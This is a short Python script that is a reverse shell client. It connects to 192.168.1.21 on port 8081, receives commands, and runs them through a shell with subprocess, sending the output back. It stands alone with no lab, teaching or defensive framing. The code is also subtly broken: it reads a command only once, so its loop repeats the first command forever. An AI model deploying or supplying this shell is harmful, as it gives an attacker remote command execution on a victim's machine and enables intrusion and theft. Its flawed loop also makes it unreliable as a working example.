#!/usr/bin/env python3
import socket
import os
import subprocess
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.21', 8081))
	command = s.recv(1024).lower().decode("utf-8")
	while 'closecon' != command:
		
		if command.startswith("cd "):
			os.chdir(str(command[3:]))
			s.send(os.getcwd().encode())
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( CMD.stdout.read() )
			s.send( CMD.stderr.read() )
	s.close()
def main ():
        connect()
main()
